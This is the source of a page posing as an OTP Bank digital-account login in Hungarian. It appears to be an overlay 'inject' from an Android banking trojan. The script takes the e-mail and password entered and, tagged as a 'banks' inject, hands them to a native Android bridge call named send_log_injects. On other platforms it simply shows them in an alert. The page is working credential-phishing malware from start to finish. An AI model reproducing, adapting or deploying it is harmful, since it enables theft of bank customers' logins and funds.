    <style>
        body {
            background-color: #f5f6f7;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            padding: 15px;
        }

        section {
            padding: 15px;
            flex: 1;
            width: 280px;
            margin: 0 auto;
        }

        footer {
            padding: 15px;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left:0;
            top: 50%;
            line-height: 0;
            color: #999999;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0em;
        }
        
        .cool-input__input:focus + .cool-input__placeholder {
            color: #000;
        }

        .input {
            width: 100%;
            border: 0;
            border-bottom: 1px solid #979797;
        }

        .input:focus {
            border-bottom: 2px solid #000;
        }

        .button {
            width: 100%;
            padding: 8px;
            border: 0;
            border-radius: 25px;
            background-color: #77b650;
            color: #fff;
            margin-bottom: 20px;
        }

        .button:disabled {
            background-color: #e3e3e3;
            color: #a4a4a4;
        }
    </style>
</head>

        </header>
        <section>
            <div class="cool-input">
                <input type="text" id="login" name="login" onkeyup="check();" class="input cool-input__input" autocomplete="off">
                <span class="cool-input__placeholder"> E-mail cím </span>
            </div>
            <div class="cool-input">
                <input type="password" id="password" name="password" onkeyup="check();" class="input cool-input__input" autocomplete="off">
                <span class="cool-input__placeholder"> Jelszó </span>
            </div>
        </section>
        <footer>
            <input type="submit" class="button" id="sendData" disabled value="Tovább">
        
            <p style="text-align: center;font-size: 14px;color: #437d22;font-weight: 600;"> Elfelejtettem a jelszavamat </p>
            <p style="text-align: center;font-size: 14px;color: #437d22;font-weight: 600;"> Még nincs OTP Digitális Fiókom </p>
        </footer>
    </form>
    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        function check() {
            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 6) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            check();
        }

        password.onkeyup = () => {
            check();
        }

        sendData.onclick = () => {
            var data = {};
            data.email = login.value;
            data.password = password.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
